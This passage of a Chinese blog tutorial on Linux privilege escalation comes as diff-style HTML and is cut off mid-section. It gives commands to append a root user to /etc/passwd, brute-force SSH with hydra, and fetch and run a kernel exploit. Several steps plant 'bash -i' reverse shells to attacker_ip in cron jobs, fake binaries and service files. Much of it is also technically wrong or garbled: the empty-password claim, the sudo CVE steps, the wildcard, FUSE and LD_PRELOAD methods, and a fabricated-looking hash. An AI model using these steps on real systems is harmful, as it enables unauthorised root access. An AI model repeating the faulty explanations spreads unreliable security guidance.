+<h3 id="说明-1">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-1">#</a></h3>
+<p>SUID（Set User ID）是文件权限中的一种特殊权限，使执行该文件的用户拥有文件所有者的权限。</p>
+<h2 id="三passwd文件提权">三、passwd文件提权<a hidden class="anchor" aria-hidden="true" href="#三passwd文件提权">#</a></h2>
+<h3 id="利用步骤-2">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-2">#</a></h3>
+<ol>
+<li>
+<p><strong>查看/etc/passwd文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查找密码字段为空的用户</strong>：</p>
+<ul>
+<li>
+<p>例如：<code>nobody:x:65534:65534::/home/nobody:/bin/false</code></p>
+</li>
+<li>
+<p>如果密码字段为空（x），则可以直接切换到该用户：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su nobody
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ol>
+<h3 id="通过修改etcpasswd文件提权的详细说明">通过修改/etc/passwd文件提权的详细说明<a hidden class="anchor" aria-hidden="true" href="#通过修改etcpasswd文件提权的详细说明">#</a></h3>
+<p>通过修改<code>/etc/passwd</code>文件写入一个新用户是Linux系统中一种有效的提权方式。这是基于系统配置错误（权限配置不当）的提权方法。
+如果/etc/passwd文件中存在密码字段为空的用户，可以直接切换到该用户，无需密码。</p>
+<h4 id="一提权条件">一、提权条件<a hidden class="anchor" aria-hidden="true" href="#一提权条件">#</a></h4>
+<ol>
+<li><strong>必须拥有对<code>/etc/passwd</code>文件的写权限</strong>（通常只有root用户有写权限）</li>
+<li><strong>系统配置错误</strong>：<code>/etc/passwd</code>文件的权限设置不当，允许普通用户写入</li>
+</ol>
+<h4 id="二提权步骤">二、提权步骤<a hidden class="anchor" aria-hidden="true" href="#二提权步骤">#</a></h4>
+<h3 id="步骤1赋予etcpasswd文件写权限如果当前没有权限">步骤1：赋予<code>/etc/passwd</code>文件写权限（如果当前没有权限）<a hidden class="anchor" aria-hidden="true" href="#步骤1赋予etcpasswd文件写权限如果当前没有权限">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">666</span> /etc/passwd
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或者</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">666</span> /etc/passwd
+</span></span></code></pre></div><blockquote>
+<p><strong>注意</strong>：如果当前用户没有sudo权限，这一步可能无法完成。在实际渗透测试中，通常需要先通过其他方式获得基本权限。</p>
+</blockquote>
+<h4 id="步骤2生成加密密码">步骤2：生成加密密码<a hidden class="anchor" aria-hidden="true" href="#步骤2生成加密密码">#</a></h4>
+<p>使用openssl生成加密密码（MD5或SHA512）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 生成MD5加密的密码（-1表示MD5算法）</span>
+</span></span><span style="display:flex;"><span>openssl passwd -1 -salt hacker <span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出示例：$1$hacker$6luIRwdGpBvXdP.GMwcZp/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 生成SHA512加密的密码（-6表示SHA512算法）</span>
+</span></span><span style="display:flex;"><span>openssl passwd -6 -salt hacker <span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出示例：$6$hacker$5kX3Zc9yqTz8QmR1aW7eJpKqL7zXwYb0vZnUeR9lMxY0pNtA3jQ</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>注意</strong>：如果使用<code>-1</code>（MD5）算法，需要确保openssl版本支持。早期版本可能不支持<code>-6</code>（SHA512）。</p>
+</blockquote>
+<h4 id="步骤3构造新用户条目">步骤3：构造新用户条目<a hidden class="anchor" aria-hidden="true" href="#步骤3构造新用户条目">#</a></h4>
+<p>新用户的格式遵循<code>/etc/passwd</code>文件的格式：</p>
+<pre tabindex="0"><code>用户名:加密密码:UID:GID:描述信息:主目录:shell
+</code></pre><p>对于root权限用户，需要设置：</p>
+<ul>
+<li>UID = 0</li>
+<li>GID = 0</li>
+<li>主目录 = /root（或任意目录，但通常设置为/root）</li>
+<li>shell = /bin/bash</li>
+</ul>
+<p>示例：</p>
+<pre tabindex="0"><code>hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash
+</code></pre><h4 id="步骤4将新用户添加到etcpasswd文件">步骤4：将新用户添加到<code>/etc/passwd</code>文件<a hidden class="anchor" aria-hidden="true" href="#步骤4将新用户添加到etcpasswd文件">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;hacker:</span>$1$hacker$6<span style="color:#e6db74">luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或者</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;hacker:</span><span style="color:#66d9ef">$(</span>openssl passwd -1 -salt hacker 123456<span style="color:#66d9ef">)</span><span style="color:#e6db74">:0:0:Test User:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd
+</span></span></code></pre></div><h4 id="步骤5切换到新用户">步骤5：切换到新用户<a hidden class="anchor" aria-hidden="true" href="#步骤5切换到新用户">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su hacker
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输入密码：123456</span>
+</span></span></code></pre></div><p>此时，你应该已经获得root权限：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出应为：uid=0(root) gid=0(root) groups=0(root)</span>
+</span></span></code></pre></div><h4 id="示例流程">示例流程<a hidden class="anchor" aria-hidden="true" href="#示例流程">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 赋予passwd文件写权限</span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">666</span> /etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 生成加密密码</span>
+</span></span><span style="display:flex;"><span>openssl passwd -1 -salt hacker <span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $1$hacker$6luIRwdGpBvXdP.GMwcZp/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 添加新用户到passwd文件</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;hacker:</span>$1$hacker$6<span style="color:#e6db74">luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 切换到新用户</span>
+</span></span><span style="display:flex;"><span>su hacker
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输入密码 123456</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 验证权限</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 输出: uid=0(root) gid=0(root) groups=0(root)</span>
+</span></span></code></pre></div><h2 id="四shadow文件提权">四、shadow文件提权<a hidden class="anchor" aria-hidden="true" href="#四shadow文件提权">#</a></h2>
+<h3 id="利用步骤-3">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-3">#</a></h3>
+<ol>
+<li>
+<p><strong>查看/etc/shadow文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/shadow
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查找密码字段为空的用户</strong>：</p>
+<ul>
+<li>
+<p>例如：<code>nobody::18555:0:99999:7:::</code></p>
+</li>
+<li>
+<p>如果密码字段为空（::），则可以直接切换到该用户：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su nobody
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-2">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-2">#</a></h3>
+<p>/etc/shadow文件存储用户密码哈希，如果密码字段为空，表示该用户无需密码即可登录。</p>
+<h2 id="五ssh登录密码爆破">五、SSH登录密码爆破<a hidden class="anchor" aria-hidden="true" href="#五ssh登录密码爆破">#</a></h2>
+<h3 id="利用步骤-4">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-4">#</a></h3>
+<ol>
+<li>
+<p><strong>使用hydra进行密码爆破</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target_ip
+</span></span></code></pre></div></li>
+<li>
+<p><strong>如果破解成功，使用SSH登录</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh username@target_ip
+</span></span></code></pre></div></li>
+<li>
+<p><strong>如果获得root权限，直接使用</strong>：</p>
+<ul>
+<li>例如：<code>ssh root@target_ip</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-3">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-3">#</a></h3>
+<p>通过暴力破解SSH登录密码，获取系统访问权限。</p>
+<h2 id="六通过计划任务提权">六、通过计划任务提权<a hidden class="anchor" aria-hidden="true" href="#六通过计划任务提权">#</a></h2>
+<h3 id="利用步骤-5">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-5">#</a></h3>
+<ol>
+<li>
+<p><strong>查看当前用户的crontab</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crontab -l
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查看系统级cron任务</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls /etc/cron.*
+</span></span></code></pre></div></li>
+<li>
+<p><strong>如果发现可写cron任务</strong>：</p>
+<ul>
+<li>
+<p>创建恶意脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#34;</span> &gt; /tmp/malicious.sh
+</span></span><span style="display:flex;"><span>chmod +x /tmp/malicious.sh
+</span></span></code></pre></div></li>
+<li>
+<p>修改cron任务，使其执行恶意脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crontab -e
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 添加一行：*/1 * * * * /tmp/malicious.sh</span>
+</span></span></code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>等待cron任务执行，获取shell</strong>：</p>
+<ul>
+<li>
+<p>通过监听端口获取shell：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-4">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-4">#</a></h3>
+<p>计划任务配置不当，低权限用户能修改计划任务执行的程序。</p>
+<h2 id="七劫持环境变量提权">七、劫持环境变量提权<a hidden class="anchor" aria-hidden="true" href="#七劫持环境变量提权">#</a></h2>
+<h3 id="利用步骤-6">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-6">#</a></h3>
+<ol>
+<li>
+<p><strong>查找可写路径</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -writable -type d 2&gt;/dev/null
+</span></span></code></pre></div></li>
+<li>
+<p><strong>将当前目录添加到PATH</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
+</span></span></code></pre></div></li>
+<li>
+<p><strong>创建恶意命令文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#34;</span> &gt; /tmp/ls
+</span></span><span style="display:flex;"><span>chmod +x /tmp/ls
+</span></span></code></pre></div></li>
+<li>
+<p><strong>执行命令</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span></code></pre></div><ul>
+<li>系统会优先执行/tmp/ls，获得shell</li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-5">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-5">#</a></h3>
+<p>通过修改PATH环境变量，使系统优先加载攻击者控制的程序。</p>
+<h2 id="八利用通配符提权">八、利用通配符提权<a hidden class="anchor" aria-hidden="true" href="#八利用通配符提权">#</a></h2>
+<h3 id="利用步骤-7">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-7">#</a></h3>
+<ol>
+<li>
+<p><strong>查找可写目录</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -writable -type d 2&gt;/dev/null
+</span></span></code></pre></div></li>
+<li>
+<p><strong>创建恶意脚本</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#34;</span> &gt; /tmp/malicious.sh
+</span></span><span style="display:flex;"><span>chmod +x /tmp/malicious.sh
+</span></span></code></pre></div></li>
+<li>
+<p><strong>创建符号链接</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln -s /tmp/malicious.sh /tmp/evil
+</span></span></code></pre></div></li>
+<li>
+<p><strong>触发通配符执行</strong>：</p>
+<ul>
+<li>如果有程序使用<code>*</code>通配符，如<code>ls *</code>，则会执行恶意脚本</li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-6">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-6">#</a></h3>
+<p>利用程序在处理通配符时的漏洞，使系统执行恶意代码。</p>
+<h2 id="九内核cve漏洞提权">九、内核CVE漏洞提权<a hidden class="anchor" aria-hidden="true" href="#九内核cve漏洞提权">#</a></h2>
+<h3 id="利用步骤-8">利用步骤：<a hidden class="anchor" aria-hidden="true" href="#利用步骤-8">#</a></h3>
+<ol>
+<li>
+<p><strong>查看系统信息</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>uname -a
+</span></span></code></pre></div></li>
+<li>
+<p><strong>查找匹配的CVE漏洞</strong>：</p>
+<ul>
+<li>例如：<code>Linux 4.8.0-58-generic #63~16.04.1-Ubuntu</code></li>
+</ul>
+</li>
+<li>
+<p><strong>下载并编译漏洞利用代码</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://www.exploit-db.com/download/43418
+</span></span><span style="display:flex;"><span>gcc 43418.c -o exploit
+</span></span></code></pre></div></li>
+<li>
+<p><strong>执行漏洞利用代码</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./exploit
+</span></span></code></pre></div></li>
+</ol>
+<h3 id="说明-7">说明：<a hidden class="anchor" aria-hidden="true" href="#说明-7">#</a></h3>
+<p>利用Linux内核中的已知漏洞获取root权限。</p>
+<h2 id="其他提权方式">其他提权方式<a hidden class="anchor" aria-hidden="true" href="#其他提权方式">#</a></h2>
+<h3 id="1-sudo漏洞提权cve-2021-3156">1. Sudo漏洞提权（CVE-2021-3156）<a hidden class="anchor" aria-hidden="true" href="#1-sudo漏洞提权cve-2021-3156">#</a></h3>
+<ul>
+<li>
+<p><strong>利用步骤</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudoedit /etc/passwd
+</span></span></code></pre></div><ul>
+<li>输入<code>#</code>，然后按<code>Enter</code>，触发漏洞</li>
+<li>系统会提示输入密码，但不需要输入，直接按<code>Enter</code>即可获得root shell</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-利用ssh配置错误提权">2. 利用SSH配置错误提权<a hidden class="anchor" aria-hidden="true" href="#2-利用ssh配置错误提权">#</a></h3>
+<ul>
+<li><strong>利用步骤</strong>：
+<ol>
+<li>查看SSH配置文件：<code>cat /etc/ssh/sshd_config</code></li>
+<li>如果发现<code>AllowUsers</code>或<code>DenyUsers</code>配置不当</li>
+<li>通过SSH登录，获取更高权限</li>
+</ol>
+</li>
+</ul>
+<h3 id="3-利用web应用提权">3. 利用Web应用提权<a hidden class="anchor" aria-hidden="true" href="#3-利用web应用提权">#</a></h3>
+<ul>
+<li><strong>利用步骤</strong>：
+<ol>
+<li>通过Web应用漏洞（如文件包含、命令执行）</li>
+<li>执行系统命令，如<code>whoami</code>、<code>id</code></li>
+<li>如果能执行<code>sudo -l</code>，则查看sudo权限</li>
+<li>利用发现的sudo权限提权</li>
+</ol>
+</li>
+</ul>
+<h3 id="4-利用ld_preload提权">4. 利用LD_PRELOAD提权<a hidden class="anchor" aria-hidden="true" href="#4-利用ld_preload提权">#</a></h3>
+<ul>
+<li>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>创建恶意共享库：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;int main() { system(&#34;/bin/bash&#34;); }&#39;</span> &gt; /tmp/exploit.c
+</span></span><span style="display:flex;"><span>gcc /tmp/exploit.c -fPIC -shared -o /tmp/libexploit.so
+</span></span></code></pre></div></li>
+<li>
+<p>设置环境变量：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export LD_PRELOAD<span style="color:#f92672">=</span>/tmp/libexploit.so
+</span></span></code></pre></div></li>
+<li>
+<p>执行命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span></code></pre></div></li>
+</ol>
+<ul>
+<li>系统会执行恶意库，获得root shell</li>
+</ul>
+</li>
+</ul>
+<h3 id="5-利用服务配置错误提权">5. 利用服务配置错误提权<a hidden class="anchor" aria-hidden="true" href="#5-利用服务配置错误提权">#</a></h3>
+<ul>
+<li>
+<p><strong>利用步骤</strong>：</p>
+<ol>
+<li>
+<p>查看系统服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl list-units --type<span style="color:#f92672">=</span>service
+</span></span></code></pre></div></li>
+<li>
+<p>如果发现服务配置不当，低权限用户对服务可执行文件有写权限</p>
+</li>
+<li>
+<p>替换为恶意程序：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;#!/bin/bash&#39;</span> &gt; /usr/bin/service
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/service
+</span></span><span style="display:flex;"><span>chmod +x /usr/bin/service
+</span></span></code></pre></div></li>
+<li>
+<p>重启服务，获得shell</p>
+</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+</blockquote>
+<h1 id="linux非常规提权方式详解">Linux非常规提权方式详解<a hidden class="anchor" aria-hidden="true" href="#linux非常规提权方式详解">#</a></h1>
+<p>在Linux系统中，除了常见的SUID、sudo配置错误、内核漏洞提权外，还有一些非常规的提权方式。这些方式往往利用系统设计中不太常见的配置或机制，下面详细介绍这些方法：</p>
+<h2 id="一利用fuse-filesystem-in-userspace-提权">一、利用FUSE (Filesystem in Userspace) 提权<a hidden class="anchor" aria-hidden="true" href="#一利用fuse-filesystem-in-userspace-提权">#</a></h2>
+<h3 id="原理">原理<a hidden class="anchor" aria-hidden="true" href="#原理">#</a></h3>
+<p>FUSE允许普通用户在用户空间实现文件系统，如果配置不当，可能允许低权限用户挂载具有高权限的文件系统。</p>
+<h3 id="利用步骤-9">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-9">#</a></h3>
+<ol>
+<li>
+<p><strong>检查FUSE是否可用</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lsmod | grep fuse
+</span></span></code></pre></div><p>如果输出中包含<code>fuse</code>模块，说明FUSE可用。</p>
+</li>
+<li>
+<p><strong>查找FUSE配置文件</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/fuse.conf
+</span></span></code></pre></div><p>重点关注<code>user_allow_other</code>是否启用。</p>
+</li>
+<li>
+<p><strong>创建恶意文件系统</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 创建一个简单的文件系统</span>
+</span></span><span style="display:flex;"><span>mkdir /tmp/fuse
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;#!/bin/bash&#39;</span> &gt; /tmp/fuse/mount.sh
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1&#39;</span> &gt;&gt; /tmp/fuse/mount.sh
+</span></span><span style="display:flex;"><span>chmod +x /tmp/fuse/mount.sh
+</span></span></code></pre></div></li>
+<li>
+<p><strong>挂载恶意文件系统</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 如果user_allow_other已启用</span>
+</span></span><span style="display:flex;"><span>mount -t fuse -o allow_other /tmp/fuse/mount.sh /tmp/mount
+</span></span></code></pre></div><ul>
+<li>系统会执行mount.sh脚本，获取shell</li>
+</ul>
+</li>
+</ol>
+<h3 id="说明-8">说明<a hidden class="anchor" aria-hidden="true" href="#说明-8">#</a></h3>
+<p>FUSE的<code>allow_other</code>选项允许其他用户访问挂载点，如果配置不当，攻击者可以挂载恶意文件系统并执行任意命令。</p>
+<h2 id="二利用system-v-ipc-提权">二、利用System V IPC 提权<a hidden class="anchor" aria-hidden="true" href="#二利用system-v-ipc-提权">#</a></h2>
+<h3 id="原理-1">原理<a hidden class="anchor" aria-hidden="true" href="#原理-1">#</a></h3>
+<p>System V IPC（进程间通信）包括共享内存、消息队列和信号量。如果配置不当，低权限用户可能利用IPC机制提升权限。</p>
+<h3 id="利用步骤-10">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤-10">#</a></h3>
+<ol>
+<li>
+<p><strong>查找可访问的IPC对象</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ipcs -m
+</span></span><span style="display:flex;"><span>ipcs -q
+</span></span><span style="display:flex;"><span>ipcs -s
+</span></span></code></pre></div></li>
+<li>
+<p><strong>尝试修改IPC对象</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 例如，修改共享内存</span>
+</span></span><span style="display:flex;"><span>ipcrm -m &lt;shmid&gt;
+</span></span></code></pre></div></li>
+<li>
+<p><strong>利用IPC对象触发漏洞</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 假设发现一个共享内存对象</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 创建一个恶意程序，利用该共享内存</span>
